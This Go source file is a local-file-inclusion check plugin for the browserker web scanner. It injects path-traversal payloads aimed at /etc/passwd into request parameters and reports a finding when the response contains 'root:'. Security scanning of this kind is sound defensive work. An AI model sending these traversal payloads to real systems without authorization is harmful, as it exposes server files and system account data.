package lfi

import (
	"context"
	"encoding/base64"
	"strings"
	"time"

	"gitlab.com/browserker/browserk"
)

type Plugin struct {
	service browserk.PluginServicer
}

func New(service browserk.PluginServicer) *Plugin {
	p := &Plugin{service: service}
	service.Register(p)
	return p
}

// Name of the plugin
func (h *Plugin) Name() string {
	return "LocalFileInclude"
}

// ID unique to browserker
func (h *Plugin) ID() string {
	return "BR-A-0003"
}

// Config for this plugin
func (h *Plugin) Config() *browserk.PluginConfig {
	return nil
}

func (h *Plugin) InitContext(bctx *browserk.Context) {

}

// Options for the plugin manager to take into consideration when dispatching
func (h *Plugin) Options() *browserk.PluginOpts {
	return &browserk.PluginOpts{
		WriteRequests: true,
		ExecutionType: browserk.ExecAlways,
		Injections:    []browserk.InjectionLocation{browserk.InjectNameValue},
	}
}

// Ready to attack
func (h *Plugin) Ready(injector browserk.Injector) (bool, error) {
	// msg := injector.Message() // get original req/resp
	expr := injector.InjectionExpr()
	for _, attack := range []string{"../../../../../../../../etc/passwd", "./../././../././../././../././../././../././../././.././etc/passwd"} {
		expr.Inject(attack, browserk.InjectValue)

		ctx, cancel := context.WithTimeout(injector.BCtx().Ctx, time.Second*15)
		defer cancel()
		m, err := injector.Send(ctx, false)
		if err != nil {
			injector.BCtx().Log.Error().Err(err).Msg("failed to inject")
			return false, nil
		}
		injector.BCtx().Log.Info().Msg("attacked!")
		body := m.Response.Body
		if m.Response.BodyEncoded {
			b, err := base64.StdEncoding.DecodeString(m.Response.Body)
			if err != nil {
				injector.BCtx().Log.Error().Err(err).Msg("failed to decode body response")
				return false, nil
			} else {
				body = string(b)
			}
		}
		if strings.Contains(body, "root:") {
			injector.BCtx().Reporter.Add(&browserk.Report{
				CheckID:     1,
				CWE:         73,
				Description: "you have lfi",
				Remediation: "don't have lfi",
				URL:         m.Request.Modified.Url,
				Nav:         injector.Nav(),
				NavResultID: injector.NavResultID(),
				Evidence: &browserk.Evidence{
					String: body,
				},
				Reported: time.Now(),
			})
			return true, nil
		}
	}
	return true, nil
}

// OnEvent handles passive events
func (h *Plugin) OnEvent(evt *browserk.PluginEvent) {
}
